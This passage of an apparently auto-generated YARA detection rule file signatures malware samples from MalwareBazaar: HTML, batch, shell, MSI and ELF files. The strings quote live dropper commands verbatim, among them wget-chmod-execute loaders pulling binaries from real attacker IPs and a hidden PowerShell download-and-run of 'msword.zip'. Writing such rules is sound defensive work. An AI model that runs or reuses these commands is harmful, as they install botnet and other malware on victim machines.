      $s17 = "qsjBYZCvyUQ2uY/HDNfKViXx5K+MukWLKGfrzQE2/JZLWOE2EQf7qBUVBrG8F+YC/5a+SaPmv0tPnvqbFhy+MLRje2TUTjmcE5GKaD0sUHfIQJuXqYXGTI3Yx9yitKq0" ascii
      $s18 = "SNZrXhi6tEBaTrMul1tigVIdSLXZoVuA1Eip2/TNgN9sE3TSsUL5tNy5B8TDWC8AA/Vg8FwvTLyrIU5CRWGeH5mjS9Dnfaa4b7PSYUEG0QzCk3w9utfsG/ZQjDC8lSPr" ascii
      $s19 = "URMe2LAGuJDOJ1wgN1cJPYJAgUQqPGUFqJ+1DCmOags+lUbkJkjVwJQb+kyFaSrHfODWUTrIapv36PYm1mtphFVXmthCxYosqLSX6Zba8LxJXmLuZsU+9Cg2Cv9SQ9wi" ascii
      $s20 = "q3USIUDXjWH6MOK+rmqQUozWhYjKcJpLJ/eKX8FEds1jdLb+nM/VMsLTQHD7irfnGkhZtWoZinD87x02KzeEcc86zNxqMh4qZim4+vkTYDK9WqM+dI88hPNJ70N83qPw" ascii
   condition:
      uint16(0) == 0x6424 and filesize < 60KB and
      8 of them
}

rule sig_82d3c4f0f8ba00bbeca5c1d3d8d0243cc386f983e8a1a9034033153d0953c2fd {
   meta:
      description = "evidences - file 82d3c4f0f8ba00bbeca5c1d3d8d0243cc386f983e8a1a9034033153d0953c2fd.html"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "82d3c4f0f8ba00bbeca5c1d3d8d0243cc386f983e8a1a9034033153d0953c2fd"
   strings:
      $s1 = "window['service_cf3_config']={\"homeUrl\":\"https://www.huaweicloud.com/\",\"furion_cdn_url\":\"https://devcloud-res.hc-cdn.com/" ascii
      $s2 = "  <script src=\"//devcloud-res.hc-cdn.com/MirrorPortal-CDN/2024.12.03/hws/runtime.fe49230f418bb661.js\" type=\"module\"></script" ascii
      $s3 = "  var d=document.body.firstChild;document.body.insertBefore(o,d);}('https://devcloud-res.hc-cdn.com/FurionSdkCDN/1.0.18/furion-c" ascii
      $s4 = "><noscript><link rel=\"stylesheet\" href=\"//devcloud-res.hc-cdn.com/MirrorPortal-CDN/2024.12.03/hws/styles.af1f3e33c304c094.css" ascii
      $s5 = "rtExternalLink\":true,\"helpScript\":\"\",\"envInfoId\":\"devcloud\",\"maintainerUrl\":\"\",\"devcloud_url\":\"https://devcloud." ascii
      $s6 = "t src=\"//devcloud-res.hc-cdn.com/MirrorPortal-CDN/2024.12.03/hws/main.67afe6559bc5e270.js\" type=\"module\"></script>" fullword ascii
      $s7 = "  <style>@charset \"UTF-8\";html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}body{margin:0;padding:0;color:#252" ascii
      $s8 = "4.huaweicloud.com/cloudartifact/repository/maven\",\"guide\":{\"rubygemsDownloadLink\":\"https://rubygems.org/pages/download?loc" ascii
      $s9 = "window['service_cf3_config']={\"homeUrl\":\"https://www.huaweicloud.com/\",\"furion_cdn_url\":\"https://devcloud-res.hc-cdn.com/" ascii
      $s10 = "ript src=\"//devcloud-res.hc-cdn.com/MirrorPortal-CDN/2024.12.03/hws/polyfills.bdccaca96d0eb103.js\" type=\"module\"></script><s" ascii
      $s11 = "  <script src=\"//devcloud-res.hc-cdn.com/MirrorPortal-CDN/2024.12.03/hws/runtime.fe49230f418bb661.js\" type=\"module\"></script" ascii
      $s12 = "  \"dir\": \"//devcloud-res.hc-cdn.com/HeaderAppCDN/24.11.0/hws/\"," fullword ascii
      $s13 = "<script>!function(x,n){window[n]=window[n]||{};window[n].config={\"appId\":\"5B69D9AB5FF940F685E4E36C0487350D\",\"setting\":\"pe" ascii
      $s14 = "    \"feedbackScripts\": \"https://res.hc-cdn.com/NPS-component/1.0.5/hws/nps-feedback.js\"," fullword ascii
      $s15 = "=\"//devcloud-res.hc-cdn.com/MirrorPortal-CDN/2024.12.03/hws/styles.af1f3e33c304c094.css\" media=\"print\" onload=\"this.media='" ascii
      $s16 = "  var d=document.body.firstChild;document.body.insertBefore(o,d);}('https://devcloud-res.hc-cdn.com/FurionSdkCDN/1.0.18/furion-c" ascii
      $s17 = "dkCDN/1.0.22/furion-cdn.min.js\",\"baseUrl\":\"https://mirrors.huaweicloud.com\",\"baseUrlCDN\":\"https://repo.huaweicloud.com\"" ascii
      $s18 = ",\"register_url\":\"https://reg.huaweicloud.com/registerui/cn/register.html?locale=zh-cn\",\"private_url\":\"https://devcloud.cn" ascii
      $s19 = "<!--FurionScriptEnd-->" fullword ascii
      $s20 = "    \"professionalServiceUrl\": \"https://console.huaweicloud.com/professionalService\"," fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 20KB and
      8 of them
}

rule sig_91619737b3f7af4623dc62b4f3df7b551337ec94f693a3b9ba35bb231483393e {
   meta:
      description = "evidences - file 91619737b3f7af4623dc62b4f3df7b551337ec94f693a3b9ba35bb231483393e.bat"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "91619737b3f7af4623dc62b4f3df7b551337ec94f693a3b9ba35bb231483393e"
   strings:
      $x1 = "powershell -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri %url2% -OutFile %USERPROFILE%\\Downloads\\W2.pdf\"" fullword ascii
      $x2 = "powershell -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri %url% -OutFile %temp%\\msword.zip\"" fullword ascii
      $x3 = "powershell -WindowStyle Hidden -Command \"Expand-Archive -Path %temp%\\msword.zip -DestinationPath %temp%\\msword -Force\"" fullword ascii
      $s4 = "cd %USERPROFILE%\\Downloads" fullword ascii
      $s5 = "start msword.exe" fullword ascii
      $s6 = "set url2=https://myguyapp.com/W2.pdf" fullword ascii
      $s7 = "set url=https://myguyapp.com/msword.zip" fullword ascii
      $s8 = "cd %temp%\\msword" fullword ascii
      $s9 = "start W2.pdf" fullword ascii
   condition:
      uint16(0) == 0x6540 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule b55d881db7644ac7a4e4f1fedfa842e895590ff0e2aa400af85a7099d7d08c32 {
   meta:
      description = "evidences - file b55d881db7644ac7a4e4f1fedfa842e895590ff0e2aa400af85a7099d7d08c32.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "b55d881db7644ac7a4e4f1fedfa842e895590ff0e2aa400af85a7099d7d08c32"
   strings:
      $s1 = "cd /tmp; rm -rf upnp; wget http://87.121.112.77/jmggnxeedy -O upnp; chmod 777 upnp; ./upnp goahead" fullword ascii
      $s2 = "cd /tmp; rm -rf upnp; wget http://87.121.112.77/xobftuootu -O upnp; chmod 777 upnp; ./upnp goahead" fullword ascii
      $s3 = "cd /tmp; rm -rf upnp; wget http://87.121.112.77/pbnpvwfhco -O upnp; chmod 777 upnp; ./upnp goahead" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule efaeb6776bc2ba6161a32e3a387c6876ad8c7dd8ab74cd117af2b9b9ea0e8bd0 {
   meta:
      description = "evidences - file efaeb6776bc2ba6161a32e3a387c6876ad8c7dd8ab74cd117af2b9b9ea0e8bd0.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "efaeb6776bc2ba6161a32e3a387c6876ad8c7dd8ab74cd117af2b9b9ea0e8bd0"
   strings:
      $s1 = "rm mpsl; wget http://103.188.82.218/mpsl; chmod 777 mpsl; ./mpsl noobs;" fullword ascii
      $s2 = "rm mips; wget http://103.188.82.218/mips; chmod 777 mips; ./mips noobs;" fullword ascii
   condition:
      uint16(0) == 0x6d72 and filesize < 1KB and
      all of them
}

rule f901a9ba79e7bb405c19fe5fbb85a6b916ea5f766e8aa02033a3805b70869759 {
   meta:
      description = "evidences - file f901a9ba79e7bb405c19fe5fbb85a6b916ea5f766e8aa02033a3805b70869759.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "f901a9ba79e7bb405c19fe5fbb85a6b916ea5f766e8aa02033a3805b70869759"
   strings:
      $x1 = "cd /tmp; rm -rf mpsl; wget http://185.142.53.43/mpsl; chmod 755 mpsl; chmod 777 * ./mpsl ppx" fullword ascii
      $s2 = "cd /tmp; rm -rf mips; wget http://185.142.53.43/mips; chmod 755 mpsl; chmod 777 *; ./mips ppx" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      1 of ($x*) and all of them
}

rule fd91fcfcfd0bbee5384e98d29c09ee4922cd80ad0e588292b3f524a96c0303f7 {
   meta:
      description = "evidences - file fd91fcfcfd0bbee5384e98d29c09ee4922cd80ad0e588292b3f524a96c0303f7.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "fd91fcfcfd0bbee5384e98d29c09ee4922cd80ad0e588292b3f524a96c0303f7"
   strings:
      $s1 = "busybox wget http://185.196.9.234/.F3NTi/fenty.arm4; chmod 777 fenty.arm4; ./fenty.arm4 adb" fullword ascii
   condition:
      uint16(0) == 0x7562 and filesize < 1KB and
      all of them
}

rule ffc2e91b051b958b8835f2011b04ef74dd1043bb913feaf8dd50a44abbc3d1da {
   meta:
      description = "evidences - file ffc2e91b051b958b8835f2011b04ef74dd1043bb913feaf8dd50a44abbc3d1da.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "ffc2e91b051b958b8835f2011b04ef74dd1043bb913feaf8dd50a44abbc3d1da"
   strings:
      $s1 = "cd /tmp; rm -rf upnp; wget http://87.121.112.77/jmggnxeedy -O upnp; chmod 777 upnp; ./upnp lilin" fullword ascii
      $s2 = "cd /tmp; rm -rf upnp; wget http://87.121.112.77/pbnpvwfhco -O upnp; chmod 777 upnp; ./upnp lilin" fullword ascii
      $s3 = "cd /tmp; rm -rf upnp; wget http://87.121.112.77/pjyhwsdgkl -O upnp; chmod 777 upnp; ./upnp lilin" fullword ascii
      $s4 = "cd /tmp; rm -rf upnp; wget http://87.121.112.77/xobftuootu -O upnp; chmod 777 upnp; ./upnp lilin" fullword ascii
      $s5 = "cd /tmp; rm -rf upnp; wget http://87.121.112.77/jmhgeojeri -O upnp; chmod 777 upnp; ./upnp lilin" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

/* Super Rules ------------------------------------------------------------- */

rule _009d0664227249a780760ed139ca85eeac7b102a5616fbf78926adb2b113b02e_021a320acf8ae6b5044bbd7382795f887194f904600b31b1a869b86722_0 {
   meta:
      description = "evidences - from files 009d0664227249a780760ed139ca85eeac7b102a5616fbf78926adb2b113b02e.msi, 021a320acf8ae6b5044bbd7382795f887194f904600b31b1a869b86722c56a91.msi, 06a94174603a072d5eee1ff190f41d5e7e514477034f092242b5e4ca727a00f8.msi, 0a5cbb89f9d5e556499fe2263fb0311167badf22849404a2da98e828b6521e83.msi, 0f43189434a353d23139e5bab220a0d0b0fd4aa3cff5f873478b0a693bab76ab.msi, 13b747831b2c2eea59e2d8f43af3ec8b52f6f3b2294202552fb2f86dce9f8878.msi, 15cfe8889cf12035c69b8b8c9d20d8a8af7dfcd6d791dbc9f40189d740bdbfe4.msi, 1b0de1c0fbe215ee45c39210abbfb6b24cc9fd1c23f126d7f2fa3ec10c2e7d0d.msi, 3e8e8ea02272c71792cb4493025223bee33d3173a0cea0061b51f39564cd8c42.msi, 85af2400e0920204ae99cf2257307601e8d5cb14a4c3cefc8f4b9b036a38296c.msi, 9267cd8abbee9a6af8ee519addf96d715feea53f657603a65e2bd0b22bf3d540.msi, ab331b489ab1bdd86151b1ba72278e37841bec12b461f55b8b7f420e579dd3fe.msi, cd0800bc609b298e5bf85491c8cafc7d0e1a658a6062dff6d0b5f6482ee415f3.msi, e52ca6f2ae03d8ac45447af89b757f78914dbda60bb1c4bcdba288ff5aa98e56.msi, e8ed66a74aad1736a15b12e4a080bfe6bf3ad94f9a3051465d0482fe365b3ff3.msi, f67e507d4ab16e5f533d03b46ef9fd28ccae59abff10a9f671c302fd0e2f2db1.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "009d0664227249a780760ed139ca85eeac7b102a5616fbf78926adb2b113b02e"
      hash2 = "021a320acf8ae6b5044bbd7382795f887194f904600b31b1a869b86722c56a91"
      hash3 = "06a94174603a072d5eee1ff190f41d5e7e514477034f092242b5e4ca727a00f8"
      hash4 = "0a5cbb89f9d5e556499fe2263fb0311167badf22849404a2da98e828b6521e83"
      hash5 = "0f43189434a353d23139e5bab220a0d0b0fd4aa3cff5f873478b0a693bab76ab"
      hash6 = "13b747831b2c2eea59e2d8f43af3ec8b52f6f3b2294202552fb2f86dce9f8878"
      hash7 = "15cfe8889cf12035c69b8b8c9d20d8a8af7dfcd6d791dbc9f40189d740bdbfe4"
      hash8 = "1b0de1c0fbe215ee45c39210abbfb6b24cc9fd1c23f126d7f2fa3ec10c2e7d0d"
      hash9 = "3e8e8ea02272c71792cb4493025223bee33d3173a0cea0061b51f39564cd8c42"
      hash10 = "85af2400e0920204ae99cf2257307601e8d5cb14a4c3cefc8f4b9b036a38296c"
      hash11 = "9267cd8abbee9a6af8ee519addf96d715feea53f657603a65e2bd0b22bf3d540"
      hash12 = "ab331b489ab1bdd86151b1ba72278e37841bec12b461f55b8b7f420e579dd3fe"
      hash13 = "cd0800bc609b298e5bf85491c8cafc7d0e1a658a6062dff6d0b5f6482ee415f3"
      hash14 = "e52ca6f2ae03d8ac45447af89b757f78914dbda60bb1c4bcdba288ff5aa98e56"
      hash15 = "e8ed66a74aad1736a15b12e4a080bfe6bf3ad94f9a3051465d0482fe365b3ff3"
      hash16 = "f67e507d4ab16e5f533d03b46ef9fd28ccae59abff10a9f671c302fd0e2f2db1"
   strings:
      $x1 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "4C4}INSTALLFOLDERl4dZhengJiaLe8964ProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProcessC" ascii
      $x3 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s4 = "ReachFramework.resources.dll" fullword wide
      $s5 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s6 = "Update.dll" fullword ascii
      $s7 = "get_loader_name_from_dll" fullword ascii
      $s8 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s9 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s10 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s11 = "qgethostname" fullword ascii
      $s12 = "process_config_directive" fullword ascii
      $s13 = "get_loader_name" fullword ascii
      $s14 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s15 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s16 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s17 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s18 = "ature attributesFeatureComponentsFeature_Foreign key into Feature table.Component_Foreign key into Component table.FilePrimary k" ascii
      $s19 = "vloader_failure" fullword ascii
      $s20 = ".TitleShort text identifying a visible feature item.Longer descriptive text describing a visible feature item.DisplayNumeric sor" ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 27000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _0f43189434a353d23139e5bab220a0d0b0fd4aa3cff5f873478b0a693bab76ab_9267cd8abbee9a6af8ee519addf96d715feea53f657603a65e2bd0b22b_1 {
   meta:
      description = "evidences - from files 0f43189434a353d23139e5bab220a0d0b0fd4aa3cff5f873478b0a693bab76ab.msi, 9267cd8abbee9a6af8ee519addf96d715feea53f657603a65e2bd0b22bf3d540.msi, ab331b489ab1bdd86151b1ba72278e37841bec12b461f55b8b7f420e579dd3fe.msi, e52ca6f2ae03d8ac45447af89b757f78914dbda60bb1c4bcdba288ff5aa98e56.msi, f67e507d4ab16e5f533d03b46ef9fd28ccae59abff10a9f671c302fd0e2f2db1.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "0f43189434a353d23139e5bab220a0d0b0fd4aa3cff5f873478b0a693bab76ab"
      hash2 = "9267cd8abbee9a6af8ee519addf96d715feea53f657603a65e2bd0b22bf3d540"
      hash3 = "ab331b489ab1bdd86151b1ba72278e37841bec12b461f55b8b7f420e579dd3fe"
      hash4 = "e52ca6f2ae03d8ac45447af89b757f78914dbda60bb1c4bcdba288ff5aa98e56"
      hash5 = "f67e507d4ab16e5f533d03b46ef9fd28ccae59abff10a9f671c302fd0e2f2db1"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "*\"[` 3=3" fullword ascii /* hex encoded string '3' */
      $s3 = "roductCode{E29365CC-8642-4BC3-AA3E-7B7E8084C00C}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s4 = "$Yw:\"j" fullword ascii
      $s5 = "UQQ.ENx" fullword ascii
      $s6 = "|O:\"&BX" fullword ascii
      $s7 = "_e'l:\\w" fullword ascii
      $s8 = "|^[%d-#" fullword ascii
      $s9 = "C\\.\".y" fullword ascii
      $s10 = "\\mfqn2\"D" fullword ascii
      $s11 = "ZSjWqu8" fullword ascii
      $s12 = "vRiSkc0" fullword ascii
      $s13 = "+ 2j6c~" fullword ascii
      $s14 = "ahzpdw" fullword ascii
      $s15 = "+ <Ky:" fullword ascii
      $s16 = "Vs[ /C" fullword ascii
      $s17 = "NFbfQG4" fullword ascii
      $s18 = "Tzu{H* " fullword ascii
      $s19 = ",,Cgh -" fullword ascii
      $s20 = "- >dna>*:V" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 27000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _13b747831b2c2eea59e2d8f43af3ec8b52f6f3b2294202552fb2f86dce9f8878_e8ed66a74aad1736a15b12e4a080bfe6bf3ad94f9a3051465d0482fe36_2 {
   meta:
      description = "evidences - from files 13b747831b2c2eea59e2d8f43af3ec8b52f6f3b2294202552fb2f86dce9f8878.msi, e8ed66a74aad1736a15b12e4a080bfe6bf3ad94f9a3051465d0482fe365b3ff3.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "13b747831b2c2eea59e2d8f43af3ec8b52f6f3b2294202552fb2f86dce9f8878"
      hash2 = "e8ed66a74aad1736a15b12e4a080bfe6bf3ad94f9a3051465d0482fe365b3ff3"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "yOUj.KsM" fullword ascii
      $s3 = "roductCode{C244B00C-3AE7-4A53-B5BB-A2E3DCB6586A}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s4 = "cThmB%T%E " fullword ascii
      $s5 = "TMPc!Vrz" fullword ascii
      $s6 = "8nK:\"v" fullword ascii
      $s7 = "u(Kx>O:\"U>" fullword ascii
      $s8 = "LLJUPPQ" fullword ascii
      $s9 = "KW8%s-" fullword ascii
      $s10 = "DLOG{w" fullword ascii
      $s11 = "%IRC~C" fullword ascii
      $s12 = "H{YSPyu}" fullword ascii
      $s13 = "I`Y\\+ " fullword ascii
      $s14 = "1Js -?" fullword ascii
      $s15 = "qVI* 5P" fullword ascii
      $s16 = "\\o~%D<h" fullword ascii
      $s17 = "7>hJ<* iUuC6" fullword ascii
      $s18 = "psqtrw" fullword ascii
      $s19 = "GeZvGvh5" fullword ascii
      $s20 = "YbyItp7" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 27000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _021a320acf8ae6b5044bbd7382795f887194f904600b31b1a869b86722c56a91_0a5cbb89f9d5e556499fe2263fb0311167badf22849404a2da98e828b6_3 {
   meta:
      description = "evidences - from files 021a320acf8ae6b5044bbd7382795f887194f904600b31b1a869b86722c56a91.msi, 0a5cbb89f9d5e556499fe2263fb0311167badf22849404a2da98e828b6521e83.msi, 3e8e8ea02272c71792cb4493025223bee33d3173a0cea0061b51f39564cd8c42.msi, 85af2400e0920204ae99cf2257307601e8d5cb14a4c3cefc8f4b9b036a38296c.msi, cd0800bc609b298e5bf85491c8cafc7d0e1a658a6062dff6d0b5f6482ee415f3.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "021a320acf8ae6b5044bbd7382795f887194f904600b31b1a869b86722c56a91"
      hash2 = "0a5cbb89f9d5e556499fe2263fb0311167badf22849404a2da98e828b6521e83"
      hash3 = "3e8e8ea02272c71792cb4493025223bee33d3173a0cea0061b51f39564cd8c42"
      hash4 = "85af2400e0920204ae99cf2257307601e8d5cb14a4c3cefc8f4b9b036a38296c"
      hash5 = "cd0800bc609b298e5bf85491c8cafc7d0e1a658a6062dff6d0b5f6482ee415f3"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $s2 = "rhWR:\\o" fullword ascii
      $s3 = "roductCode{5B4BCE2C-518E-4215-8842-F8650FD63D61}ProductLanguage1033ProductNameProductVersion1.2.4.9UpgradeCodel not be installed" ascii
      $s4 = "MHQn3- " fullword ascii
      $s5 = "Y:\"2@S" fullword ascii
      $s6 = "CV /kX" fullword ascii
      $s7 = "SAM:Sdn6Ets" fullword ascii
      $s8 = "rZXQl10" fullword ascii
      $s9 = "kjVoVNg2" fullword ascii
      $s10 = "l}> -x}M)" fullword ascii
      $s11 = "NzgheC6" fullword ascii
      $s12 = "\"* z+s.\"Pz" fullword ascii
      $s13 = "&%lW%9H," fullword ascii
      $s14 = "\\Cladv_2" fullword ascii
      $s15 = "kwqRre#" fullword ascii
      $s16 = "#rLIsYj\"" fullword ascii
      $s17 = "q5.Xkl\\" fullword ascii
      $s18 = "F8pdDO\\p" fullword ascii
      $s19 = "fSxgy3D" fullword ascii
      $s20 = "JDTa8CJ" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 25000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _17739a4a7b0f5269ec1bf78b60a9b6553ffe61a13d07f11a8ff16e027ad23b5a_97ab0caaed85cd2ec2f2ccc571043a668573f18d63f3e10b6867f2f740_4 {
   meta:
      description = "evidences - from files 17739a4a7b0f5269ec1bf78b60a9b6553ffe61a13d07f11a8ff16e027ad23b5a.elf, 97ab0caaed85cd2ec2f2ccc571043a668573f18d63f3e10b6867f2f7402e9591.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "17739a4a7b0f5269ec1bf78b60a9b6553ffe61a13d07f11a8ff16e027ad23b5a"
      hash2 = "97ab0caaed85cd2ec2f2ccc571043a668573f18d63f3e10b6867f2f7402e9591"
   strings:
      $s1 = "No child process" fullword ascii
      $s2 = "No file descriptors available" fullword ascii
      $s3 = "Remote I/O error" fullword ascii
      $s4 = "No error information" fullword ascii
      $s5 = "rustc version 1.85.0-nightly (9c707a8b7 2024-12-07)" fullword ascii
      $s6 = "Connection reset by network" fullword ascii
      $s7 = "Address in use" fullword ascii
      $s8 = "CStr::from_bytes_with_nul failed/" fullword ascii
      $s9 = "Connection aborted" fullword ascii /* Goodware String - occured 20 times */
      $s10 = "Protocol error" fullword ascii /* Goodware String - occured 26 times */
      $s11 = "Network unreachable" fullword ascii /* Goodware String - occured 53 times */
      $s12 = "Protocol not supported" fullword ascii /* Goodware String - occured 73 times */
      $s13 = "Connection refused" fullword ascii /* Goodware String - occured 127 times */
      $s14 = "Broken pipe" fullword ascii /* Goodware String - occured 742 times */
      $s15 = "Permission denied" fullword ascii /* Goodware String - occured 823 times */
      $s16 = "Value too large for data type" fullword ascii
      $s17 = "Stale file handle" fullword ascii
      $s18 = "Device timeout" fullword ascii
      $s19 = "Wrong medium type" fullword ascii
      $s20 = "Message too large" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _67913b98eae4f0a2b269025cd6ef950d57d2447f332abf86590cc3f1bef51a92_716804dc52929e19b87c3d81e69250c79abaec9a8741ee5ebb80a6e2dc_5 {
   meta:
      description = "evidences - from files 67913b98eae4f0a2b269025cd6ef950d57d2447f332abf86590cc3f1bef51a92.elf, 716804dc52929e19b87c3d81e69250c79abaec9a8741ee5ebb80a6e2dcbccdbb.elf, d721c05478570f8c5e7910f5ca0ca9bebd344d35eedfc4989100b5f13bb1432a.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-05"
      hash1 = "67913b98eae4f0a2b269025cd6ef950d57d2447f332abf86590cc3f1bef51a92"
      hash2 = "716804dc52929e19b87c3d81e69250c79abaec9a8741ee5ebb80a6e2dcbccdbb"
      hash3 = "d721c05478570f8c5e7910f5ca0ca9bebd344d35eedfc4989100b5f13bb1432a"
   strings:
      $s1 = "relogin.htm" fullword ascii
      $s2 = "User-Agent: curl/7.88.1" fullword ascii
      $s3 = "authkey" fullword ascii
      $s4 = "hostport=" fullword ascii
      $s5 = "Hash.Cookie" fullword ascii
      $s6 = "{ \"Name\" : \"OPSystemUpgrade\", \"OPSystemUpgrade\" : { \"Action\" : \"Start\", \"Type\" : \"System\" }, \"SessionID\" : \"0x0" ascii
      $s7 = "o?head-?ebs" fullword ascii
      $s8 = "t{|}f&~gq{&fdt{|}f9&d&oggodm&kget{|}f:&d&oggodm&kget{|}f;&d&oggodm&kget{|}f<&d&oggodm&kget{|}f&~gax{|}f|&kget{|}f&{axfm|&fm|" fullword ascii
      $s9 = "pluginVersionTip" fullword ascii
      $s10 = "mini_httpd" fullword ascii
      $s11 = "cgi-bin/main-cgi" fullword ascii
      $s12 = "?ages/?ogin.htm" fullword ascii
      $s13 = "{ \"Ret\" : 100, \"SessionID\" : \"0x0\" }" fullword ascii
      $s14 = "\"OPSystemUpgrade\", \"Ret\" : 100" fullword ascii
      $s15 = "HTTPD_gw" fullword ascii
      $s16 = "?ogin.rsp" fullword ascii
      $s17 = "doc/script" fullword ascii
      $s18 = "TKXGYKI" fullword ascii
      $s19 = "111.111.111.111" fullword ascii
      $s20 = "\\XBRnUTG1" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}
